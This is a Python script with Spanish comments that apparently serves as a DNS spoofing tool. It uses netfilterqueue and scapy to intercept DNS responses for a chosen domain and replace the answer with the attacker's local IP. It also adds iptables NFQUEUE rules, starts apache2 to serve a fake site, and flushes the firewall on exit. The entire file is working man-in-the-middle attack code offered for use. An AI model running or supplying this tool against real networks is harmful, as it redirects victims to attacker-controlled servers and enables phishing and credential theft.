#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import signal
import socket
import netifaces
import sys
import os
import argparse
import requests
from termcolor import colored


def def_handler(sig,frame):
  print(colored(f"\n[+] Saliendo...\n","red"))
  drequirements()
  sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


def get_arguments(): # Creamos una función para gestionar la lógica de los posibles parámetros

  parser= argparse.ArgumentParser(description="Herramienta para envenenar DNS")
  parser.add_argument("-d","--domain", dest="domain", help="Nombre del dominio a envenenar", required=True) # Parámetro requerido

  return parser.parse_args() # Retornamos las opciones


def process_packet(packet): # Creamos una función donde gestionaremos la lógica para tratar los paquetes

  ip = obtener_direccion_red()
  scapy_packet= scapy.IP(packet.get_payload())
  args=get_arguments()
  args_encode= args.domain.encode()


  if scapy_packet.haslayer(scapy.DNSRR): # Filtramos por la capa DNSRR
    qname = scapy_packet[scapy.DNSQR].qname # Almacenamos el dominio solicitado

    if args_encode in qname: # Si nuestro dominio indicado es el que ha visitado la víctima
      print(f"\n[+] Envenenando el dominio {args.domain}")

      answer = scapy.DNSRR(rrname=qname, rdata=ip) # Creamos un paquete reply indicando nuestra ip y el dominio
      scapy_packet[scapy.DNS].an = answer # Vinculamos el paquete original al creado por nosotros
      scapy_packet[scapy.DNS].ancount =1 # Modificamos el campo acount para indicar que solo hay una respuesta

      del scapy_packet[scapy.IP].len # Borramos el campo len de IP
      del scapy_packet[scapy.IP].chksum # Borramos el campo chksum de IP
      del scapy_packet[scapy.UDP].len # Borramos el campo len de UDP
      del scapy_packet[scapy.UDP].chksum # Borramos el campo chksum de UDP
# De esta forma vulneramos la verificación de paquetes

      packet.set_payload(scapy_packet.build()) # Seteamos el nuevo paquete creado

  packet.accept()

def requirements():
  os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
  os.system("iptables --policy FORWARD ACCEPT")
  os.system("systemctl start apache2")


def drequirements():
  os.system("iptables -D INPUT 1")
  os.system("iptables -D INPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -D OUTPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0")
  os.system("iptables -F")
  os.system("iptables --policy INPUT ACCEPT")
  os.system("iptables --policy OUTPUT ACCEPT")
  os.system("iptables --policy FORWARD DROP")
  os.system("systemctl stop apache2")


def obtener_direccion_red():
    interfaz = netifaces.gateways()['default'][netifaces.AF_INET][1]  # Obtener la interfaz de red predeterminada
    direccion_ip = netifaces.ifaddresses(interfaz)[netifaces.AF_INET][0]['addr']  # Dirección IP

    return direccion_ip



def main():

  requirements()
  queue = netfilterqueue.NetfilterQueue() # Creamos el objeto queue
  queue.bind(0,process_packet) # Nos asociamos al número de cola 0 cambiado del iptables y cada paquete lo tratamos con la función process_packet
  queue.run() # Analizamos todos los paquetes


if __name__ == '__main__':
  main()


